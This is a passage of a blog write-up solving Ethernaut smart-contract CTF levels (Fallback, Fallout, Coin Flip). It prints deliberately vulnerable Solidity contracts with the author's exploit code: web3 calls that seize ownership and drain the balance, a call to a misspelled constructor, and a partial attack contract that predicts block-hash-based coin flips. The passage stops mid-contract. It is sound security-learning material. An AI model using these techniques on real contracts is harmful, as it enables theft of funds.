<!doctype html><html lang=en data-mode=dark><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>The Ethernaut | 0x4ka5h's Blog</title><link rel=apple-touch-icon href=https://0x4ka5h.github.io/images/favicons/apple-touch-icon.png sizes=180x180><link rel=icon href=https://0x4ka5h.github.io/images/favicons/favicon-32x32.png sizes=32x32 type=image/png><link rel=icon href=https://0x4ka5h.github.io/images/favicons/favicon-16x16.png sizes=16x16 type=image/png><link rel=manifest href=https://0x4ka5h.github.io/images/favicons/manifest.json><link rel=icon href=https://0x4ka5h.github.io/images/favicons/favicon.ico><meta name=keywords content><meta name=description content=" My approch towards the CTF challanges "><meta itemprop=name content="The Ethernaut"><meta itemprop=description content=" My approch towards the CTF challanges "><meta itemprop=datePublished content="2022-10-27T07:34:48+08:30"><meta itemprop=dateModified content="2022-10-27T07:34:48+08:30"><meta itemprop=wordCount content="6095"><meta itemprop=image content="https://0x4ka5h.github.io/posts/ethernaut/images/_card.png"><meta itemprop=keywords content=","><meta property="og:title" content="The Ethernaut"><meta property="og:description" content=" My approch towards the CTF challanges "><meta property="og:type" content="article"><meta property="og:url" content="https://0x4ka5h.github.io/posts/ethernaut/"><meta property="og:image" content="https://0x4ka5h.github.io/posts/ethernaut/images/_card.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-27T07:34:48+08:30"><meta property="article:modified_time" content="2022-10-27T07:34:48+08:30"><meta name=twitter:card content="summary"><meta name=twitter:image content="https://0x4ka5h.github.io/posts/ethernaut/images/_card.png"><meta name=twitter:title content="The Ethernaut"><meta name=twitter:description content=" My approch towards the CTF challanges "><meta name=twitter:site content="@0x4ka5h"><link rel=preload href=https://0x4ka5h.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin=anonymous as=style onload='this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://0x4ka5h.github.io/css/bundle.min.fcd024e77e7ca8dc30926e1b5389582b45bdb44482ee20d1ae3aae2c00de9817.css integrity="sha256-/NAk5358qNwwkm4bU4lYK0W9tESC7iDRrjquLADemBc=" crossorigin=anonymous></noscript><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Consolas" type=text/css media=all referrerpolicy=no-referrer><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Fira+Code" type=text/css media=all><style>body{font-family:consolas}code{font-family:fira code}code{tab-size:4}</style></head><body><script src=https://0x4ka5h.github.io/js/bootstrap.min.062c2e66b557cb779d59cedff7e0cc76e84beb665a1076e474e87d940be44245.js integrity="sha256-BiwuZrVXy3edWc7f9+DMduhL62ZaEHbkdOh9lAvkQkU=" crossorigin=anonymous></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top"><div class=container><button class=navbar-toggler type=button data-bs-toggle=collapse data-bs-target=#navbarSupportedContent aria-controls=navbarSupportedContent aria-expanded=false aria-label="Toggle navigation">
<i class="fas fa-bars"></i>
</button><a class="navbar-brand me-3" href=https://0x4ka5h.github.io/>0x4ka5h's Blog</a>
<button class=navbar-social-share type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasSocialShare aria-controls=offcanvasSocialShare aria-label="Toggle social share">
<i class="fas fa-share-alt"></i></button><div class="offcanvas offcanvas-bottom surface" tabindex=-1 id=offcanvasSocialShare aria-labelledby=offcanvasSocialShare><div class=offcanvas-header><h3 class=offcanvas-title>Share</h3><button type=button class="btn btn-sm btn-outline-primary" data-bs-dismiss=offcanvas aria-label=Close>
<i class="fas fa-times"></i></button></div><div class=offcanvas-body><a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Twitter Share Button" target=_blank href="https://twitter.com/intent/tweet?title=The%20Ethernaut&url=https%3a%2f%2f0x4ka5h.github.io%2fposts%2fethernaut%2f"><i class="fab fa-fw fa-twitter"></i> Twitter</a>
<a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Facebook Share Button" target=_blank href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2f0x4ka5h.github.io%2fposts%2fethernaut%2f"><i class="fab fa-fw fa-facebook-f"></i> Facebook</a></div></div><button class=navbar-settings type=button data-bs-toggle=offcanvas data-bs-target=#offcanvasSettings aria-controls=offcanvasSettings aria-label="Toggle settings">
<i class="fas fa-ellipsis-v"></i></button><div class="offcanvas offcanvas-end surface h-100" tabindex=-1 id=offcanvasSettings aria-labelledby=offcanvasSettings><div class=offcanvas-header><h3 class=offcanvas-title>Settings</h3><button type=button class="btn btn-sm btn-outline-primary" data-bs-dismiss=offcanvas aria-label=Close>
<i class="fas fa-times"></i></button></div><div class=offcanvas-body><section class=setting><form class="font-size-switcher-form row"><div class=col-auto><label for=fontSize class=form-label><i class="fas fa-fw fa-font"></i> Font Size</label></div><div class="col-auto ms-auto"><input type=range class=form-range min=-2 max=2 id=fontSize></div></form></section><section class="setting palettes"><form class=row><div class=col-auto><label><i class="fas fa-fw fa-palette"></i> Palette</label></div><div class="col-auto ms-auto"><a id=btnPalette class="btn btn-sm btn-outline-primary" role=button aria-label=palettePicker><i class="fas fa-eye-dropper"></i></a></div></form><div class="mt-2 d-flex visually-hidden" id=palettePicker><button type=button id=palette-blue aria-label=Blue class="btn btn-sm palette" data-palette=blue>
</button><button type=button id=palette-blue-gray aria-label="Blue Gray" class="btn btn-sm palette" data-palette=blue-gray>
</button><button type=button id=palette-brown aria-label=Brown class="btn btn-sm palette" data-palette=brown>
</button><button type=button id=palette-cyan aria-label=Cyan class="btn btn-sm palette" data-palette=cyan>
</button><button type=button id=palette-green aria-label=Green class="btn btn-sm palette" data-palette=green>
</button><button type=button id=palette-indigo aria-label=Indigo class="btn btn-sm palette" data-palette=indigo>
</button><button type=button id=palette-orange aria-label=Orange class="btn btn-sm palette" data-palette=orange>
</button><button type=button id=palette-pink aria-label=Pink class="btn btn-sm palette" data-palette=pink>
</button><button type=button id=palette-purple aria-label=Purple class="btn btn-sm palette" data-palette=purple>
</button><button type=button id=palette-red aria-label=Red class="btn btn-sm palette" data-palette=red>
</button><button type=button id=palette-teal aria-label=Teal class="btn btn-sm palette" data-palette=teal>
</button><button type=button id=palette-yellow aria-label=Yellow class="btn btn-sm palette" data-palette=yellow></button></div></section></div></div><div class="collapse navbar-collapse" tabindex=-1 id=navbarSupportedContent aria-labelledby=navbarSupportedContent><ul class="navbar-nav ms-auto"><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/archives/><i class="fas fa-fw fa-file-archive"></i>Archives</a></li><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/categories/><i class="fas fa-fw fa-folder"></i>Categories</a></li><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/tags/><i class="fas fa-fw fa-tags"></i>Tags</a></li><li class=nav-item><a class=nav-link href=https://0x4ka5h.github.io/series/><i class="fas fa-fw fa-columns"></i>Series</a></li></ul></div></div></nav></header><main role=main class=container><div class="row content"><div class=col-lg-8><div class=container><nav class="row card component" aria-label=breadcrumb><div class=card-body><ol class=breadcrumb><li class=breadcrumb-item><a href=https://0x4ka5h.github.io/>Home</a></li><li class=breadcrumb-item><a href=https://0x4ka5h.github.io/posts/>Posts</a></li><li class="breadcrumb-item active">The Ethernaut</li></ol></div></nav><article class="row card component mb-4 post"><div class=post-panel-wrapper><div class="d-flex flex-column component rounded post-panel"><a id=sidebarToggler class="action d-none d-lg-block" role=button><i class="fas fa-fw fa-expand-alt" data-fa-transform=rotate-45></i></a></div></div><div class=card-body><h1 class="card-title my-3">The Ethernaut</h1><div class=post-meta><span class=post-date title="created on"><i class="fas fa-fw fa-calendar-alt"></i>Oct 27, 2022
</span><span class=post-reading-time title="reading time"><i class="fas fa-fw fa-coffee"></i>29 min read
</span><a href=https://0x4ka5h.github.io/categories/ethernaut/ class="badge rounded-pill text-white bg-primary post-taxonomy">Ethernaut</a><a href=https://0x4ka5h.github.io/categories/solidity/ class="badge rounded-pill text-white bg-primary post-taxonomy">Solidity</a><a href=https://0x4ka5h.github.io/categories/security/ class="badge rounded-pill text-white bg-primary post-taxonomy">Security</a><a href=https://0x4ka5h.github.io/categories/ctf/ class="badge rounded-pill text-white bg-primary post-taxonomy">CTF</a><a href=https://0x4ka5h.github.io/categories/smart-contract/ class="badge rounded-pill text-white bg-primary post-taxonomy">Smart Contract</a><a href=https://0x4ka5h.github.io/categories/web3/ class="badge rounded-pill text-white bg-primary post-taxonomy">Web3</a></div><div class="post-content mb-3"><p>Sup!?</p><p>Hey, there! long time no see ah? I forgot to tell you that now I&rsquo;m currently learning blockchain security related stuff. I&rsquo;m able to solved some challenges from Ethernaut CTF and I took previous writeups help to understand remaining.</p><p>Some of my seniors @S3v3ru5*, @D1r3w0lf, @Sud0u53r and @S1r1u5* are doing in blockchain security and suggested me to solve these challenges to learn about basic bugs in solidity. Unlike web2 CTFs, Ethernaut is a Web3/Solidity based and played in Ethereum Virtual Machine (EVM). Each level is a smart contract that needs to be ‘hacked’.</p><p>I have read Mastering Ethereum book and a blog series about EVM bytecode and how solidity uses EVM storage. They made some challenges easier for me, so I recommend you to read them before getting started with the CTF.</p><h3 id=hello-ethernaut>Hello Ethernaut</h3><p>This is an introductory challenge. Challenge description mentions the method name of the contract to call. calling that method from browser console gives information about another method. and we just need to follow the rabit and then authenticate. The password is &ldquo;ethernaut0&rdquo;.</p><h3 id=fallback>Fallback</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Fallback</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=k>public</span> <span class=n>contributions</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>payable</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>1000</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>onlyOwner</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s>&#34;caller is not the owner&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>contribute</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>.</span><span class=mi>001</span> <span class=kc>ether</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>+=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=n>contributions</span><span class=p>[</span><span class=n>owner</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>getContribution</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>withdraw</span><span class=p>()</span> <span class=k>public</span> <span class=n>onlyOwner</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=o>&amp;&amp;</span> <span class=n>contributions</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><ul><li>Our goal is to claim ownership of the contract and to reduce its balance to 0. To do that, we have to call the fallback function receive(), where the owner is set to msg.sender.</li><li>To pass the require check in receive function, we have to contribute some ether to the contract using the contribute() function and then call the contract with empty data field to trigger receive function.</li><li>To reduce the balance to 0, we simply have to call withdraw() function and it will transfer all the amount to our account.</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// Exploit
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kr>await</span> <span class=nx>web3</span><span class=p>.</span><span class=nx>eth</span><span class=p>.</span><span class=nx>sendTransaction</span><span class=p>({</span>
</span></span><span class=line><span class=cl>  <span class=nx>from</span><span class=o>:</span> <span class=nx>player</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>to</span><span class=o>:</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>data</span><span class=o>:</span> <span class=nx>web3</span><span class=p>.</span><span class=nx>eth</span><span class=p>.</span><span class=nx>abi</span><span class=p>.</span><span class=nx>encodeFunctionSignature</span><span class=p>(</span><span class=s2>&#34;contribute()&#34;</span><span class=p>),</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span><span class=o>:</span> <span class=mi>10</span> <span class=o>**</span> <span class=mi>14</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>web3</span><span class=p>.</span><span class=nx>eth</span><span class=p>.</span><span class=nx>sendTransaction</span><span class=p>({</span>
</span></span><span class=line><span class=cl>  <span class=nx>from</span><span class=o>:</span> <span class=nx>player</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>to</span><span class=o>:</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>data</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nx>value</span><span class=o>:</span> <span class=mi>10</span> <span class=o>**</span> <span class=mi>10</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>withdraw</span><span class=p>();</span>
</span></span></code></pre></div><h3 id=fallout>Fallout</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Fallout</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kd>mapping</span> <span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>uint</span><span class=p>)</span> <span class=n>allocations</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>address</span> <span class=k>payable</span> <span class=k>public</span> <span class=n>owner</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=cm>/* constructor */</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>Fal1out</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>owner</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>allocations</span><span class=p>[</span><span class=n>owner</span><span class=p>]</span> <span class=o>=</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>modifier</span> <span class=nf>onlyOwner</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	        <span class=nb>require</span><span class=p>(</span>
</span></span><span class=line><span class=cl>	            <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>owner</span><span class=p>,</span>
</span></span><span class=line><span class=cl>	            <span class=s>&#34;caller is not the owner&#34;</span>
</span></span><span class=line><span class=cl>	        <span class=p>);</span>
</span></span><span class=line><span class=cl>	        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>allocate</span><span class=p>()</span> <span class=k>public</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>allocations</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>allocations</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>sendAllocation</span><span class=p>(</span><span class=kt>address</span> <span class=k>payable</span> <span class=n>allocator</span><span class=p>)</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>require</span><span class=p>(</span><span class=n>allocations</span><span class=p>[</span><span class=n>allocator</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>allocator</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=n>allocations</span><span class=p>[</span><span class=n>allocator</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>collectAllocations</span><span class=p>()</span> <span class=k>public</span> <span class=n>onlyOwner</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>).</span><span class=nb>balance</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>allocatorBalance</span><span class=p>(</span><span class=kt>address</span> <span class=n>allocator</span><span class=p>)</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>allocations</span><span class=p>[</span><span class=n>allocator</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The flaw in this contract is that the constructor name is misspelled so the solidity considers it a function rather than constructor. Now we can simply call the function Fal1out() to become the owner of the contract.
So,</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>await</span> <span class=nx>contract</span><span class=p>.</span><span class=nx>Fal1Out</span><span class=p>();</span>
</span></span></code></pre></div><h3 id=coin-flip>Coin Flip</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>6</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#39;@openzeppelin/contracts/math/SafeMath.sol&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>CoinFlip</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kn>using</span> <span class=n>SafeMath</span> <span class=k>for</span> <span class=kt>uint256</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=k>public</span> <span class=n>consecutiveWins</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=n>lastHash</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=n>FACTOR</span> <span class=o>=</span> <span class=mi>57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>constructor</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>consecutiveWins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>flip</span><span class=p>(</span><span class=kt>bool</span> <span class=n>_guess</span><span class=p>)</span> <span class=k>public</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>blockValue</span> <span class=o>=</span> <span class=kt>uint256</span><span class=p>(</span><span class=nb>blockhash</span><span class=p>(</span><span class=nb>block</span><span class=p>.</span><span class=nb>number</span><span class=p>.</span><span class=n>sub</span><span class=p>(</span><span class=mi>1</span><span class=p>)));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lastHash</span> <span class=o>==</span> <span class=n>blockValue</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nb>revert</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>lastHash</span> <span class=o>=</span> <span class=n>blockValue</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>coinFlip</span> <span class=o>=</span> <span class=n>blockValue</span><span class=p>.</span><span class=n>div</span><span class=p>(</span><span class=n>FACTOR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=n>side</span> <span class=o>=</span> <span class=n>coinFlip</span> <span class=o>==</span> <span class=mi>1</span> <span class=o>?</span> <span class=kc>true</span> <span class=o>:</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>side</span> <span class=o>==</span> <span class=n>_guess</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>consecutiveWins</span><span class=o>++</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>consecutiveWins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>We have to call flip method with a guess and it is considered a win if our guess matches with the contract calculated guess. we have to guess the flip correctly 10 times in line to complete the challenge. The bug is in the calculation of the contract filp, it is calculated solely based on the block hash of the block the transaction is in. The block hash will be same for every other transaction included in the same block as the flip method call transaction. so, the idea is to calculate the &ldquo;guess&rdquo; using our exploit smart contract and call the challenge smart contract using message call with the calculated guess.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>COINFLIP</span><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>flip</span><span class=p>(</span><span class=kt>bool</span> <span class=n>_guess</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Attack</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=n>lastHash</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>uint256</span> <span class=n>FACTOR</span> <span class=o>=</span> <span class=mi>57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>COINFLIP</span> <span class=n>cF</span> <span class=o>=</span> <span class=n>COINFLIP</span><span class=p>(</span><span class=mh>0xEf226d8FB965d6DA727fE8794d94f9746E18b060</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>function</span> <span class=nf>calculateFlip</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
